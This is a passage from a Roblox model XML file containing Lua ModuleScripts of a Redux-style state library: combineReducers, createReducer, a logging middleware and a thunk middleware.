	Create a composite reducer from a map of keys and sub-reducers.
]]
local function combineReducers(map)
	return function(state, action)
		-- If state is nil, substitute it with a blank table.
		if state == nil then
			state = {}
		end

		local newState = {}

		for key, reducer in pairs(map) do
			-- Each reducer gets its own state, not the entire state table
			newState[key] = reducer(state[key], action)
		end

		return newState
	end
end

return combineReducers
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXBF203A68728943F58F6E045531DB56DB">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createReducer</string>
					<string name="ScriptGuid">{061BA76E-29E8-401A-96E7-DFC7ABC17D49}</string>
					<ProtectedString name="Source"><![CDATA[return function(initialState, handlers)
	return function(state, action)
		if state == nil then
			state = initialState
		end

		local handler = handlers[action.type]

		if handler then
			return handler(state, action)
		end

		return state
	end
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX666CDF3ADF4B450FBAB14A7CCC2BAD28">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">loggerMiddleware</string>
					<string name="ScriptGuid">{ECFDC2F3-345F-41A9-AC72-9ECC5099A22C}</string>
					<ProtectedString name="Source"><![CDATA[local indent = "    "

local function prettyPrint(value, indentLevel)
	indentLevel = indentLevel or 0
	local output = {}

	if typeof(value) == "table" then
		table.insert(output, "{\n")

		for key, value in pairs(value) do
			table.insert(output, indent:rep(indentLevel + 1))
			table.insert(output, tostring(key))
			table.insert(output, " = ")

			table.insert(output, prettyPrint(value, indentLevel + 1))
			table.insert(output, "\n")
		end

		table.insert(output, indent:rep(indentLevel))
		table.insert(output, "}")
	elseif typeof(value) == "string" then
		table.insert(output, string.format("%q", value))
		table.insert(output, " (string)")
	else
		table.insert(output, tostring(value))
		table.insert(output, " (")
		table.insert(output, typeof(value))
		table.insert(output, ")")
	end

	return table.concat(output, "")
end

-- We want to be able to override outputFunction in tests, so the shape of this
-- module is kind of unconventional.
--
-- We fix it this weird shape in init.lua.
local loggerMiddleware = {
	outputFunction = print,
}

function loggerMiddleware.middleware(nextDispatch, store)
	return function(action)
		local result = nextDispatch(action)

		loggerMiddleware.outputFunction(("Action dispatched: %s\nState changed to: %s"):format(
			prettyPrint(action),
			prettyPrint(store:getState())
		))

		return result
	end
end

return loggerMiddleware
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXBCBA6224166A4CF9A047082FF164D3D1">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">thunkMiddleware</string>
					<string name="ScriptGuid">{63E0D180-B934-4107-953F-5582B94EDE0B}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A middleware that allows for functions to be dispatched.
	Functions will receive a single argument, the store itself.
	This middleware consumes the function; middleware further down the chain
	will not receive it.
]]
local function thunkMiddleware(nextDispatch, store)
	return function(action)
		if typeof(action) == "function" then
			return action(store)
		else
			return nextDispatch(action)
		end
	end
end

return thunkMiddleware
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
		</Item>
	</Item>
</roblox>